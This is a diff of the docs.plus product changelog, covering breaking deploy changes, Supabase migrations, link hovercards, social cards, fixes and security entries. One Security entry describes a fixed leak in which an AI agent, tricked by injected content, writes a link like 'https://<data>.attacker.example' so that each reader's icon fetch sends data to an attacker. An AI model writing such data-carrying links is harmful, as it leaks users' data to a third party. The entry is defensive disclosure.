@@ -12,13 +12,17 @@ This file is the product changelog. Every app, package and extension keeps its o
 
 ### Breaking
 
-- Pull `traefik:v3.6` at 3.6.18 or later, or Traefik does not start.
+- Pull `traefik:v3.6` at 3.6.18 or later, or Traefik does not start. The bundled
+  `traefik.yml` now drops query strings from the access log, and older builds refuse that key
+  ([#515](https://github.com/docs-plus/docs.plus/issues/515)). After the pull,
+  `docker run --rm traefik:v3.6 version` prints the build you have.
 - Set `VAPID_PUBLIC_KEY` and `VAPID_PRIVATE_KEY`, or the production worker reports
-  unhealthy and the deploy rolls back
+  unhealthy. The repository deploy then rolls back
   ([#608](https://github.com/docs-plus/docs.plus/issues/608)).
 - `get_document_member_previews`, `get_document_members` and
-  `admin_get_document_member_counts` take new parameter names
-  ([#574](https://github.com/docs-plus/docs.plus/issues/574)).
+  `admin_get_document_member_counts` take a document id, not a slug. `p_slugs` becomes
+  `p_document_ids`, and `p_slug` becomes `p_document_id`. The webapp and the REST server in this
+  release send the new names ([#574](https://github.com/docs-plus/docs.plus/issues/574)).
 - `POST /api/email/send-digest` is removed, and it now answers 404. Nothing in the repo called
   it. Digests send only through the email queue
   ([#661](https://github.com/docs-plus/docs.plus/issues/661)).
@@ -26,10 +30,9 @@ This file is the product changelog. Every app, package and extension keeps its o
 ### Migration
 
 **If you self-host.** Read the [hocuspocus Migration](apps/hocuspocus.server/CHANGELOG.md#migration)
-before you deploy, and follow its order. It pushes six Supabase migrations with the backend and
-frontend deploy, and holds `20261026120000`
-([#570](https://github.com/docs-plus/docs.plus/issues/570)). It pushes `20261103120000` only after the
-backend is live ([#661](https://github.com/docs-plus/docs.plus/issues/661)). Until `20261023120000` and the backend both land, the member
+before you deploy, and follow its order. This release adds eight Supabase migrations. Seven go
+with the backend and frontend deploy. `20261103120000` goes only after the backend is live
+([#661](https://github.com/docs-plus/docs.plus/issues/661)). Until `20261023120000` and the backend both land, the member
 faces, the roster and the admin member counts fail
 ([#574](https://github.com/docs-plus/docs.plus/issues/574)).
 [`packages/supabase/CHANGELOG.md`](packages/supabase/CHANGELOG.md) says what each migration does.
@@ -39,8 +42,29 @@ The Supabase Auth mail templates moved to
 `magic-link.html` into **Magic Link** and `confirm-signup.html` into **Confirm signup**. Paste
 them after the deploy, not before: the new links need the new frontend.
 
-`APP_HOSTS` must now hold bare host names, such as `docs.plus,new.docs.plus`. A scheme, a port or a
-path stops the server at boot. See [hocuspocus Changed](apps/hocuspocus.server/CHANGELOG.md#changed).
+The deploy's `migrate` step applies two Prisma migrations for the social card. Before you turn on the `document`
+card kind (`SOCIAL_CARD_KINDS`), run `scripts/backfill-card-data.ts` once in a one-off container: a dry run first, then `--apply`
+([#663](https://github.com/docs-plus/docs.plus/issues/663)).
+
+The new optional setting `APP_HOSTS` lists the hosts that serve pads. Empty means the `APP_URL`
+host and its `www.` form. Each entry is a bare host name, such as `docs.plus`. A scheme, a port or
+a path stops the server at boot. See
+[hocuspocus Security](apps/hocuspocus.server/CHANGELOG.md#security)
+([#687](https://github.com/docs-plus/docs.plus/issues/687)).
+
+Four more new settings are optional. `SOCIAL_CARD_KINDS` is empty by default, so every pad link
+shows the Fallback card until you turn kinds on. `GITHUB_TOKEN` and `STACKEXCHANGE_KEY` raise the
+quotas for link preview facts. `LINK_ICON_MAX_BYTES` caps one link icon, at 32768 bytes by
+default. [`apps/hocuspocus.server/ENV.md`](apps/hocuspocus.server/ENV.md)
+describes each one.
+
+**If you use the npm extensions.** All six `@docs.plus/extension-*` packages raise their
+`@tiptap/core` and `@tiptap/pm` peer floor to `^3.32.2`. Upgrade both first. No export or option
+was removed. The hyperlink and hypermultimedia defaults and output changed, so read
+[`extension-hyperlink` migration](extensions/extension-hyperlink/docs/migration.md) and
+[`extension-hypermultimedia` migration](extensions/extension-hypermultimedia/docs/migration.md).
+[`extension-mermaid`](extensions/extension-mermaid/CHANGELOG.md) now hands non-Mermaid code
+blocks to the next node view ([#627](https://github.com/docs-plus/docs.plus/issues/627)).
 
 ### Added
 
@@ -50,16 +74,16 @@ path stops the server at boot. See [hocuspocus Changed](apps/hocuspocus.server/C
   in an option block after the link, `![video](url){width=800 controls=false}`. So an AI app
   that writes Markdown, a Markdown import and a Markdown export keep them. The guide is
   [Media in Markdown](docs/media-in-markdown.md).
-
 - A shared pad link now shows a docs.plus card in chat apps and on social sites
   ([#663](https://github.com/docs-plus/docs.plus/issues/663)). A public pad with an owner shows
   its real content: its name, its first paragraph or its section names, and an "Open the
   document" link. From 3 members the card also says "N people joined". Every other pad link
-  shows the docs.plus homepage card. A section, a chat room, a message, a version or a filter
-  link can get a card of its own, and each kind turns on with `SOCIAL_CARD_KINDS`. A card never
+  shows the Fallback card, the docs.plus homepage card. A section, a chat room, a message, a version or a filter
+  link can get a card of its own. Each kind turns on with `SOCIAL_CARD_KINDS`, and every kind is
+  off by default. Since 2026-11-03, docs.plus runs the pad card (`document`) only. A card never
   shows a name, a face or message text, and a Private pad never gets one.
 - When a pad's description only repeats its title or address, the link preview shows the
-  docs.plus description instead.
+  docs.plus description instead ([#663](https://github.com/docs-plus/docs.plus/issues/663)).
 - The server icon route `GET /api/metadata/icon` finds a site's icon for pad links. It
   tries `/favicon.ico` first. When that file has no icon, it reads the site's page head, as
   on Notion. `LINK_ICON_MAX_BYTES` caps one icon at 32768 bytes by default, so the LinkedIn
@@ -67,13 +91,20 @@ path stops the server at boot. See [hocuspocus Changed](apps/hocuspocus.server/C
   no `404` ([#515](https://github.com/docs-plus/docs.plus/issues/515)).
 - Every pad link shows a link icon before its text: the site's favicon, the docs.plus logo,
   or a mail or phone glyph. A link with no icon stays a plain link
-  ([#516](https://github.com/docs-plus/docs.plus/issues/516)).
+  ([#516](https://github.com/docs-plus/docs.plus/issues/516)). A pasted link gets its icon too
+  ([#636](https://github.com/docs-plus/docs.plus/issues/636)). Links in posted chat messages
+  show the same icons, and a click opens the link preview
+  ([#678](https://github.com/docs-plus/docs.plus/issues/678)).
 - The Home Screen app now has a launch image for every current iPhone size, so no iPhone
   opens it on a black screen ([#255](https://github.com/docs-plus/docs.plus/issues/255)).
-- On a desktop pad, rest the pointer on an external link and a hovercard opens. The request starts after 150 ms, and the card opens at 500 ms at the earliest. It
-  shows the page's picture, site, title and description. Our server fetches all of it, so your
-  browser sends nothing to the linked site. A click still opens the link preview
+- On a desktop pad, rest the pointer on an external link and a hovercard opens. The request
+  starts after 150 ms, and the card opens at 500 ms at the earliest. It shows the page's
+  picture, site, title and description. Our server fetches all of it, so your browser sends
+  nothing to the linked site. A click still opens the link preview
   ([#242](https://github.com/docs-plus/docs.plus/issues/242)).
+- The hovercard shows up to three facts for some pages. A job page shows its place, work type
+  and posting date. A GitHub repository shows stars, language and last push. A Stack Overflow
+  question shows its answers ([#242](https://github.com/docs-plus/docs.plus/issues/242)).
 - A docs.plus link has its own hovercard on the desktop pad. It covers a link to another pad, a
   heading, a chat, a message, a filter or a version. A Private pad you cannot open shows only
   "This document is private" ([#242](https://github.com/docs-plus/docs.plus/issues/242)).
@@ -91,43 +122,58 @@ path stops the server at boot. See [hocuspocus Changed](apps/hocuspocus.server/C
   address.
 - Settings → Appearance has a "Link previews" card with three switches: hovercards, page titles
   for pasted links, and pad titles for pasted pad links. Each switch is on by default, is stored
-  per browser, and applies only while you are signed in.
+  per browser, and applies only while you are signed in. A visitor who is not signed in gets all
+  three on ([#242](https://github.com/docs-plus/docs.plus/issues/242),
+  [#681](https://github.com/docs-plus/docs.plus/issues/681),
+  [#680](https://github.com/docs-plus/docs.plus/issues/680)).
 - A link to a part of this pad shows as a chip with its kind icon: heading, chat, filter, version
   or top ([#174](https://github.com/docs-plus/docs.plus/issues/174)). A filter link's preview
   names every term.
 - With the caret inside a link, Mod+K opens its preview and Alt+Enter opens the link. Mod-click
-  opens a new tab. Links show the hand cursor only while Mod is held.
+  opens a new tab. Links show the hand cursor only while Mod is held
+  ([d21895f01](https://github.com/docs-plus/docs.plus/commit/d21895f01),
+  [9789e6577](https://github.com/docs-plus/docs.plus/commit/9789e6577)).
 - The tick rail section preview is now a card you can use
   ([#645](https://github.com/docs-plus/docs.plus/issues/645)). Its chat button opens that
   heading's chat. The keyboard can Tab into the card and leave it with Escape.
 - A History share link carries `?version=<n>`, so it opens History at that version, and the server
   can draw that version's card ([#668](https://github.com/docs-plus/docs.plus/issues/668)).
 - DOCX import accepts every tracked change in a file and says so, with the new warning code
-  `tracked-changes-accepted`.
+  `tracked-changes-accepted` ([#662](https://github.com/docs-plus/docs.plus/issues/662)).
 
 ### Changed
 
 - Markdown export writes a resized audio or video as `![video](url){width=400 height=300}`. It
   wrote `![video](url width=400 height=300)` before. Import still reads the old form
   ([#244](https://github.com/docs-plus/docs.plus/issues/244)).
+- Markdown import reads text in braces right after a picture or a player as an option block. So
+  `![chart](chart.png){draft}` now loses `{draft}`. Before, that text stayed in the pad. Put a
+  space before the brace to keep it ([#244](https://github.com/docs-plus/docs.plus/issues/244)).
 - A pad link to the docs.plus home page or to `new.docs.plus` now shows the docs.plus logo, as
   a link to another pad does. It showed the site icon before
   ([#516](https://github.com/docs-plus/docs.plus/issues/516), maintainer ruling 2026-11-09).
-
 - Markdown export, and what an AI app reads, now writes underlined text as `<u>text</u>`. Before,
   it wrote `++text++`. Markdown import reads only `<u>` now, so older `++text++` comes in as
-  plain text. The change comes from TipTap 3.32.2.
+  plain text. The change comes from TipTap 3.32.2
+  ([7c3d7d26c](https://github.com/docs-plus/docs.plus/commit/7c3d7d26c)).
 - Google sign-in now shows "docs.plus" in Google's account chooser, not the Supabase project
   address. Supabase Auth answers on the custom domain `auth.docs.plus`, and Google verified the
   docs.plus brand. A self-hoster can do the same: see
   [Turn on Google sign-in](docs/self-hosting/configuration.md#turn-on-google-sign-in).
+- The privacy page now says how docs.plus uses the data that Google sign-in sends, and lists
+  your data rights. It also says which link data goes to our server, to GitHub, to Stack
+  Exchange and to archive.org
+  ([a19f6f7c1](https://github.com/docs-plus/docs.plus/commit/a19f6f7c1),
+  [9faaae60d](https://github.com/docs-plus/docs.plus/commit/9faaae60d)).
 - The production deploy now aborts below 20 GB free disk, up from 10 GB. It prunes Docker
-  build cache toward a free-space target, not by age.
+  build cache toward a free-space target, not by age
+  ([#564](https://github.com/docs-plus/docs.plus/issues/564)).
 - The production deploy now stops when `VAPID_PUBLIC_KEY` and `NEXT_PUBLIC_VAPID_PUBLIC_KEY`
   differ ([#609](https://github.com/docs-plus/docs.plus/issues/609)).
-- When several people edit one document on two collaboration replicas, typing now costs about
-  70 to 120 KB of Redis traffic per keystroke instead of 281 KB on a large edited document. A
-  patch on `@hocuspocus/extension-redis` 3.4.4 sends the sync request at most once per 250 ms
+- When several people edit one document on two collaboration replicas, fast typing costs less
+  Redis traffic. On a 5.36 MB edited document, one keystroke cost 281 KB. Now it costs about 70
+  KB at one key per 50 ms, and about 120 KB at one key per 100 ms. A patch on
+  `@hocuspocus/extension-redis` 3.4.4 sends the sync request at most once per 250 ms
   ([#595](https://github.com/docs-plus/docs.plus/issues/595)).
 - A large pad opens faster. The editor now mounts before the first sync, so a cold load
   builds each block once, not twice in production. On a 2000-link pad, the link icons add
@@ -160,26 +206,104 @@ path stops the server at boot. See [hocuspocus Changed](apps/hocuspocus.server/C
   drop on the middle of a row nests the section inside that row.
 - A paste from the same pad keeps each heading's id, so a full cut and paste keeps heading chats
   and `?id=` links ([#700](https://github.com/docs-plus/docs.plus/issues/700)).
-- A heading with no text now has a TOC row, with a grey label such as "Heading 2".
-- A plain click on a link to another pad opens that pad in the same window.
+- A heading with no text now has a TOC row, with a grey label such as "Heading 2"
+  ([#499](https://github.com/docs-plus/docs.plus/issues/499)).
+- A plain click on a link to another pad opens that pad in the same window, in the pad and in
+  chat. Mod-click and middle-click still open a new tab
+  ([#359](https://github.com/docs-plus/docs.plus/issues/359)).
+- A plain link in the pad and the chat composer underlines on hover. Before, it faded
+  ([02ca037bf](https://github.com/docs-plus/docs.plus/commit/02ca037bf)).
+- **Extensions.** Each of the six `@docs.plus/extension-*` packages has changes for the next
+  family release. Each package's `CHANGELOG.md` holds the detail.
+  - [`extension-hyperlink`](extensions/extension-hyperlink/CHANGELOG.md): link icons, the
+    hovercard, page titles for pasted links, link keys, and one `navigate` option for every link
+    it opens ([#242](https://github.com/docs-plus/docs.plus/issues/242),
+    [#513](https://github.com/docs-plus/docs.plus/issues/513),
+    [#514](https://github.com/docs-plus/docs.plus/issues/514)).
+  - [`extension-hypermultimedia`](extensions/extension-hypermultimedia/CHANGELOG.md): captions
+    and options through Markdown, captions through HTML, and images with no file extension
+    ([#244](https://github.com/docs-plus/docs.plus/issues/244),
+    [#637](https://github.com/docs-plus/docs.plus/issues/637)).
+  - [`extension-mermaid`](extensions/extension-mermaid/CHANGELOG.md): `mermaidNodeView` for
+    your own code block view, and other code blocks pass through
+    ([#627](https://github.com/docs-plus/docs.plus/issues/627),
+    [#628](https://github.com/docs-plus/docs.plus/issues/628)).
+  - [`extension-indent`](extensions/extension-indent/CHANGELOG.md),
+    [`extension-inline-code`](extensions/extension-inline-code/CHANGELOG.md) and
+    [`extension-placeholder`](extensions/extension-placeholder/CHANGELOG.md): no source change.
+    They raise the Tiptap peer floor, and all three update their docs.
 
 ### Fixed
 
 - On a phone, the link sheet for a `mailto:`, `tel:` or `slack://` link shows a mail, phone or
   Slack icon, as the desktop preview does. It showed an empty grey box before
   ([#517](https://github.com/docs-plus/docs.plus/issues/517)).
-
 - **Folded sections open again.** A folded section stayed shut. A click on its fold in the pad
-  or on its arrow in the table of contents did nothing.
+  or on its arrow in the table of contents did nothing
+  ([3ad154202](https://github.com/docs-plus/docs.plus/commit/3ad154202)).
 - **Email sign-in works from any browser.** A sign-in link opened in a mail app's own browser,
   such as Gmail's, signed in nowhere. The link now signs in wherever it opens, and sign-in
-  errors say what to do next.
+  errors say what to do next
+  ([7d6fe22c4](https://github.com/docs-plus/docs.plus/commit/7d6fe22c4),
+  [f6539d7f6](https://github.com/docs-plus/docs.plus/commit/f6539d7f6)).
 - **Sign-in no longer stops when the browser wrongly says offline.** Chrome can report offline
   after a Mac sleeps while the network works. Email sign-in, Google sign-in and online status
-  then failed until Chrome restarted.
+  then failed until Chrome restarted
+  ([ede9e0224](https://github.com/docs-plus/docs.plus/commit/ede9e0224)).
+- **The pad no longer adds an empty H1 at the end of every document**
+  ([#572](https://github.com/docs-plus/docs.plus/issues/572)). A document that already ends in
+  one keeps it until someone deletes it or replaces the document.
+- **A slow database read no longer sends a pad to the error page.** The pad's owner and sign-in
+  reads now wait at most 2 s each. A late owner read renders the pad without the owner's
+  profile ([#596](https://github.com/docs-plus/docs.plus/issues/596)).
+- **TOC moves are safer.**
+  - Two people who move one section at the same time no longer leave two copies of it
+    ([#510](https://github.com/docs-plus/docs.plus/issues/510)).
+  - "Delete section" no longer shows on the title row, where it could delete the whole
+    document. It also no longer shows on a locked pad, and a locked pad starts no drag
+    ([#611](https://github.com/docs-plus/docs.plus/issues/611)).
+  - A drop below a folded row lands after that row's whole section. A caret inside a dragged
+    section moves with it ([#499](https://github.com/docs-plus/docs.plus/issues/499)).
+- **Heading links and heading chats hold.**
+  - A heading link lands on its heading, even when a fold or a filter hides it
+    ([#338](https://github.com/docs-plus/docs.plus/issues/338)).
+  - A Settings file replace keeps more heading chats, `?id=` links and folds. Its confirm card
+    names each heading chat that holds messages and will lose them
+    ([#474](https://github.com/docs-plus/docs.plus/issues/474)).
+  - The file replace warning now says that History keeps the earlier version
+    ([#662](https://github.com/docs-plus/docs.plus/issues/662)).
+- **Small things in the pad work better.**
+  - Opening a link preview no longer changes the document, so co-editors get no update
+    ([#519](https://github.com/docs-plus/docs.plus/issues/519)).
+  - Desktop link Edit works after a co-editor types above the link
+    ([#678](https://github.com/docs-plus/docs.plus/issues/678)).
+  - A `/new` link's preview says that it opens a blank document in a new tab
+    ([6a7675247](https://github.com/docs-plus/docs.plus/commit/6a7675247)).
+  - The phone edit toolbar stays hidden on a read-only pad
+    ([#308](https://github.com/docs-plus/docs.plus/issues/308)).
+  - After a heading deep link, the first Tab goes to "Skip to main content", not to a TOC row
+    ([#309](https://github.com/docs-plus/docs.plus/issues/309)).
+  - A push notification click marks the notification read when it opens a new window
+    ([#312](https://github.com/docs-plus/docs.plus/issues/312)).
+  - Documents list rows are real links, so a middle-click or a Cmd-click opens a new tab
+    ([#699](https://github.com/docs-plus/docs.plus/issues/699)).
+  - Pad addresses behave. A notification row names the document, not a filter term. A stale
+    `?msg_id=` no longer opens another room. A tap on a heading in the phone TOC drawer keeps
+    the heading in the address. A filter link with `%25` no longer throws
+    ([#646](https://github.com/docs-plus/docs.plus/issues/646)).
+  - The TOC is faster on long documents. The unread count no longer scans every chat for each
+    row, and a sash drag resizes the TOC once per frame
+    ([ea14e4ad4](https://github.com/docs-plus/docs.plus/commit/ea14e4ad4),
+    [24b788e86](https://github.com/docs-plus/docs.plus/commit/24b788e86)).
 - **Chat emails open the right pad.** An immediate chat email opened the home page, and a digest
   link could open a new empty pad. An immediate chat email now opens the pad at the message, and a
-  digest opens the pad's chat ([#647](https://github.com/docs-plus/docs.plus/issues/647)).
+  digest opens the pad's chat ([#647](https://github.com/docs-plus/docs.plus/issues/647)). Each
+  digest row now reads the status of its own mail, so the admin `sent` count is right.
+- **The admin dashboard is safer.** A failed view-stats read now
+  fails the stale-document audit and purges nothing. Before, it scored every document as never
+  viewed ([#578](https://github.com/docs-plus/docs.plus/issues/578)). The MCP Usage page no
+  longer fails with a 500 when no OAuth app is registered
+  ([cf97baaf7](https://github.com/docs-plus/docs.plus/commit/cf97baaf7)).
 - **Member faces show on every document again.** Documents made before 2026-08-09, the
   `/demo` pad among them, showed no faces in the Documents list, no roster and no admin
   member count. The lookup now uses the document's id, never its slug
@@ -200,7 +324,7 @@ path stops the server at boot. See [hocuspocus Changed](apps/hocuspocus.server/C
 - The link forms store `google.com,` as `https://google.com`, and `user@example.com.` as an
   email link. Before, the trailing punctuation stayed in the stored link ([#242](https://github.com/docs-plus/docs.plus/issues/242)).
 - Changing only a link's URL no longer undoes a co-editor's change to the link text
-  ([#242](https://github.com/docs-plus/docs.plus/issues/242)).
+  ([#643](https://github.com/docs-plus/docs.plus/issues/643)).
 - A typed link that ends in a closing parenthesis, such as a Wikipedia `Foo_(bar)` link, keeps
   it. Before, autolink cut the `)` off the stored link, in the pad and in chat
   ([#242](https://github.com/docs-plus/docs.plus/issues/242)).
@@ -220,23 +344,46 @@ path stops the server at boot. See [hocuspocus Changed](apps/hocuspocus.server/C
   icon no longer adds an empty line break
   ([#513](https://github.com/docs-plus/docs.plus/issues/513)).
 - **Phone sheets work better with a keyboard and a screen reader.** Close returns focus to the
-  link that opened the sheet, the page behind a sheet stays hidden from screen readers, and
-  Shift+Tab wraps inside the sheet ([#248](https://github.com/docs-plus/docs.plus/issues/248),
+  link that opened the sheet. The page behind a sheet stays hidden from screen readers. Shift+Tab
+  wraps inside the sheet ([#248](https://github.com/docs-plus/docs.plus/issues/248),
   [#310](https://github.com/docs-plus/docs.plus/issues/310)).
-- **Pasted images no longer vanish.** An image whose address has no file extension, as many
-  image sites and CDNs serve, was dropped on paste and on HTML import with no warning. It now
-  stays. An image that fails to load says "Couldn’t load this image" and names the site it comes
-  from, in place of the browser's broken-image icon
+- **Pasted images no longer vanish.** Many image sites and CDNs serve images from an address
+  with no file extension. Paste and HTML import dropped such an image with no warning. Now it
+  stays. An image that fails to load says "Couldn’t load this image" and names its site. It no
+  longer shows the browser's broken-image icon
   ([#637](https://github.com/docs-plus/docs.plus/issues/637)). Detail in
   [`extension-hypermultimedia`](extensions/extension-hypermultimedia/CHANGELOG.md).
 
 ### Security
 
-- A table `colspan` is clamped to 64 on every export and on DOCX import, so one stored huge value
-  can no longer make an export stop the REST process. Detail in
+- A table `colspan` is clamped to 64 on every export and on DOCX import. So one stored huge
+  value can no longer make an export stop the REST process
+  ([#662](https://github.com/docs-plus/docs.plus/issues/662)). Detail in
   [`apps/hocuspocus.server/CHANGELOG.md`](apps/hocuspocus.server/CHANGELOG.md).
-- The webapp runs Next.js 15.5.28 and DOMPurify 3.4.17. The admin dashboard runs Next.js 16.4.4. Redeploy both apps.
-- **Sentry stays on the narrow collection baseline.** `@sentry/nextjs` and `@sentry/bun` are `11.10.0`. `withSentryConfig` loads from `@sentry/nextjs/config`. `dataCollection` keeps the version 10 limits. MCP tool text stays off. A live GlitchTip event is still unproven.
+- The webapp runs Next.js 15.5.28 and DOMPurify 3.4.17, for the October advisories. The admin
+  dashboard runs Next.js 16.4.4. Redeploy both apps
+  ([8f5b13f6e](https://github.com/docs-plus/docs.plus/commit/8f5b13f6e)).
+- **Sentry stays on the narrow collection baseline.** `@sentry/nextjs` and `@sentry/bun` are
+  `11.10.0`. Sentry 11 sends cookies and request bodies by default. `dataCollection` keeps the
+  version 10 limits, and MCP tool text stays off
+  ([7c3d7d26c](https://github.com/docs-plus/docs.plus/commit/7c3d7d26c)).
+- **Site icons no longer come from Google.** Profile links, Settings links and link previews load
+  site icons from the docs.plus server. Before, each icon sent the reader's IP address and the
+  site to Google ([#517](https://github.com/docs-plus/docs.plus/issues/517)).
+- **A link in a pad can no longer leak data through its icon.** An AI agent can be tricked into
+  writing a link such as `https://<data>.attacker.example`. Every reader's pad then fetched that
+  host's icon, so the data reached the attacker with no click. The icon route now fetches only
+  the site's main domain ([#690](https://github.com/docs-plus/docs.plus/issues/690)).
+- **A pad that turns Private hides its cached link cards.** Before, a link preview could show its
+  title for up to 24 h after the pad turned Private
+  ([#687](https://github.com/docs-plus/docs.plus/issues/687)).
+- **Link card text drops control and bidi characters**, so a page title can no longer flip how
+  a hovercard reads ([#242](https://github.com/docs-plus/docs.plus/issues/242)).
+- **A chat email or digest leaves out a pad its reader cannot open,** such as someone else's
+  Private pad or a pad in Trash ([#647](https://github.com/docs-plus/docs.plus/issues/647),
+  [eefbb35de](https://github.com/docs-plus/docs.plus/commit/eefbb35de)).
+- **History has a per-connection byte budget.** Each connection may receive about 20 MB of
+  History replies per 10 s ([#214](https://github.com/docs-plus/docs.plus/issues/214)).
 - **An erased account can no longer write back its profile, preferences or push devices.**
   Needs Supabase migration `20261024120000`
   ([#579](https://github.com/docs-plus/docs.plus/issues/579)).
@@ -259,8 +406,16 @@ path stops the server at boot. See [hocuspocus Changed](apps/hocuspocus.server/C
   them. Needs Supabase migration `20261025120000`
   ([#605](https://github.com/docs-plus/docs.plus/issues/605)).
 
+### Documentation
+
+- `README.md` is now two screens long. Its detail moved to `CONTRIBUTING.md` and `docs/`
+  ([#541](https://github.com/docs-plus/docs.plus/issues/541)).
+
 ### Internal
 
+- Prisma is 7.10.1 ([#198](https://github.com/docs-plus/docs.plus/issues/198)).
+- One shared package, `@docs.plus/pad-url`, builds every pad link in the webapp and the server,
+  so both give the same answer ([#648](https://github.com/docs-plus/docs.plus/issues/648)).
 - The App Performance dashboard plots the card chat read p95 on its own seconds axis. The
   deploy's Bun version check can no longer fail a deploy; it only warns.
 - The `commit-msg` hook checks only the first line of a message, and caps it at 72 characters.
